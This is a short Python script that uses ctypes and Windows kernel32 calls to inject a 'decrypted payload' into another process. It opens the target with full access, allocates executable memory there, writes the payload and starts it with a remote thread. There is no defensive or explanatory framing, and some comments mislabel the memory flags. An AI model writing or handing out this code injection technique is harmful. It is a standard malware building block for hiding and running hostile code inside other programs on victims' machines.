import ctypes

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# get a handle to the target process
process_id = 1234 # replace with the process ID of the target process
process_handle = kernel32.OpenProcess(
    ctypes.c_uint32(0x001F0FFF), # desired access rights
    False, # handle inheritance flag
    process_id # process ID
)

# allocate memory in the target process
allocation_size = 4096 # replace with the size of the decrypted payload
allocation_address = kernel32.VirtualAllocEx(
    process_handle, # target process handle
    None, # address of the memory block to allocate
    ctypes.c_uint32(allocation_size), # size of the memory block to allocate
    ctypes.c_uint32(0x1000 | 0x2000), # allocation type and protection flags
    ctypes.c_uint32(0x40) # access rights
)

# write the decrypted payload to the allocated memory in the target process
payload_data = b'...' # replace with the decrypted payload data
payload_size = len(payload_data)
kernel32.WriteProcessMemory(
    process_handle, # target process handle
    allocation_address, # address of the memory block to write to
    payload_data, # buffer containing the data to write
    ctypes.c_uint32(payload_size), # size of the data to write
    None # number of bytes written (not used)
)

# execute the decrypted payload in the target process
kernel32.CreateRemoteThread(
    process_handle, # target process handle
    None, # thread attributes (default)
    0, # stack size (default)
    allocation_address, # address of the function to execute (i.e. the payload)
    None, # arguments to the function (not used)
    0, # creation flags (default)
    None # thread ID (not used)
)
